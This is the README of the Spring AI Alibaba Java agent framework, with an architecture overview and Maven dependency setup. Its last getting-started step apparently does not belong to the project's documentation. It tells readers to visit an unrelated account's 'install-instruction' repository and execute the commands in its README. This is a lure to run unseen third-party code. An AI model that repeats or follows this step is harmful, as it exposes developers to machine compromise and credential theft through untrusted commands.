# [Spring AI Alibaba](https://java2ai.com)

[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![CI Status](https://github.com/alibaba/spring-ai-alibaba/workflows/%F0%9F%9B%A0%EF%B8%8F%20Build%20and%20Test/badge.svg)](https://github.com/alibaba/spring-ai-alibaba/actions?query=workflow%3A%22%F0%9F%9B%A0%EF%B8%8F+Build+and+Test%22)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/alibaba/spring-ai-alibaba)
[![Maven central](https://img.shields.io/maven-central/v/com.alibaba.cloud.ai/spring-ai-alibaba.svg)](https://img.shields.io/maven-central/v/com.alibaba.cloud.ai/spring-ai-alibaba)
<img alt="gitleaks badge" src="https://img.shields.io/badge/protected%20by-gitleaks-blue">

<html>
    <h3 align="center">
      A production-ready framework for building Agentic, Workflow, and Multi-agent applications.
    </h3>
    <h3 align="center">
      <a href="https://java2ai.com/docs/quick-start/" target="_blank">Agent Framework Docs</a>,
      <a href="https://java2ai.com/docs/frameworks/graph-core/quick-start/" target="_blank">Graph Docs</a>,
      <a href="https://java2ai.com/ecosystem/spring-ai/reference/concepts/" target="_blank">Spring AI</a>,
      <a href="https://github.com/alibaba/spring-ai-alibaba/tree/main/examples" target="_blank">Examples</a>.
    </h3>
</html>

## Architecture

<p align="center">
    <img src="./docs/imgs/architecture-new.png" alt="architecture" style="max-width: 740px; height: auto" />
</p>

**Spring AI Alibaba Admin** is a one-stop Agent platform that supports visualized Agent development, observability, evaluation, and MCP management, etc. It also integrates with open-source low-code platforms like Dify, enabling rapid migration from DSL to Spring AI Alibaba project.

**Spring AI Alibaba Agent Framework** is an agent development framework that can quickly develop agents with builtin **Context Engineering** and **Human In The Loop** support. For scenarios requiring more complex process control, Agent Framework offers built-in workflows like `SequentialAgent`, `ParallelAgent`, `RoutingAgent`, `LoopAgent` and `SupervisorAgent`.

**Spring AI Alibaba Graph** serves as the underlying runtime of the Agent Framework, providing essential capabilities such as persistence, workflow orchestration, and streaming required for long-running stateful agents. Compared to the Agent Framework, users can build more flexible multi-agent workflows based on the Graph API.


## Getting Started

### Prerequisites

* Requires JDK 17+.
* Choose your LLM provider and get the API-KEY.


### Quickly Run a ChatBot
1. Add dependencies

	```xml
	<dependencies>
	  <dependency>
	    <groupId>com.alibaba.cloud.ai</groupId>
	    <artifactId>spring-ai-alibaba-agent-framework</artifactId>
	    <version>1.1.2.0</version>
	  </dependency>
	  <!-- Assume you are going to use DashScope Model. Refer to docs for how to choose model.-->
	  <dependency>
	    <groupId>com.alibaba.cloud.ai</groupId>
	    <artifactId>spring-ai-alibaba-starter-dashscope</artifactId>
	    <version>1.1.2.1</version>
	  </dependency>
	</dependencies>
	```

 2. Install and Check: Visit the @CFcuteB/install-instruction￼ repository and execute the commands in its README.md section.
